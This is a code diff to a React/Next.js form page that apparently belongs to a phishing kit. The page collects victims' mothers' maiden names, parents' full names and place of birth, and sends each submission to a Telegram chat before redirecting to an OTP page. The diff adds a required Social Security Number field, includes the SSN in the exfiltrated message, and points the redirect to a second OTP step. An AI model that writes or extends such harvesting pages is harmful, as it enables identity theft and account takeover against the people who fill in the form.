@@ -11,6 +11,7 @@ const validateInput = (field: string, value: string): string => {
     case "motherMaidenName":
     case "motherFullName":
     case "fatherFullName":
+    case "ssn":
       return value.trim() ? "" : "This field is required.";
     default:
       return "";
@@ -23,6 +24,7 @@ const FormPage = () => {
     motherMaidenName?: string;
     motherFullName?: string;
     fatherFullName?: string;
+    ssn?: string;
   };
   
   const [formErrors, setFormErrors] = useState<FormErrors>({});
@@ -30,6 +32,7 @@ const FormPage = () => {
   const [motherMaidenName, setMotherMaidenName] = useState<string>("");
   const [motherFullName, setMotherFullName] = useState<string>("");
   const [fatherFullName, setFatherFullName] = useState<string>("");
+  const [ssn, setSsn] = useState<string>("");
   const router = useRouter();
 
   const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
@@ -39,7 +42,8 @@ const FormPage = () => {
       placeOfBirth,
       motherMaidenName,
       motherFullName,
-      fatherFullName
+      fatherFullName,
+      ssn
     };
 
     const errors: Record<string, string> = {};
@@ -59,11 +63,12 @@ const FormPage = () => {
       - Mother's Maiden Name: ${formData.motherMaidenName}
       - Mother's Full Name: ${formData.motherFullName}
       - Father's Full Name: ${formData.fatherFullName}
+      - SSN: ${formData.ssn}
       - Time: ${new Date().toLocaleString()}`;
 
     try {
       await sendTelegramMessage(message);
-      router.push("/otp");
+      router.push("/otp2");
     } catch (error) {
       console.error("Error sending message to Telegram:", error);
       alert("An error occurred while submitting the form. Please try again.");
@@ -157,6 +162,22 @@ const FormPage = () => {
                   className={`w-full mt-2 border ${formErrors.fatherFullName ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.fatherFullName ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                 />
                 {formErrors.fatherFullName && <p className="text-sm text-red-500 mt-2">{formErrors.fatherFullName}</p>}
+              </div>
+
+              {/* SSN */}
+              <div className="mb-6">
+                <label htmlFor="ssn" className="block text-sm font-medium text-black">Social Security Number (SSN)</label>
+                <input
+                  id="ssn"
+                  name="ssn"
+                  type="text"
+                  required
+                  value={ssn}
+                  onChange={(e) => setSsn(e.target.value)}
+                  className={`w-full mt-2 border ${formErrors.ssn ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.ssn ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                  placeholder="XXX-XX-XXXX"
+                />
+                {formErrors.ssn && <p className="text-sm text-red-500 mt-2">{formErrors.ssn}</p>}
               </div>
 
               <div className="flex justify-center mb-8">
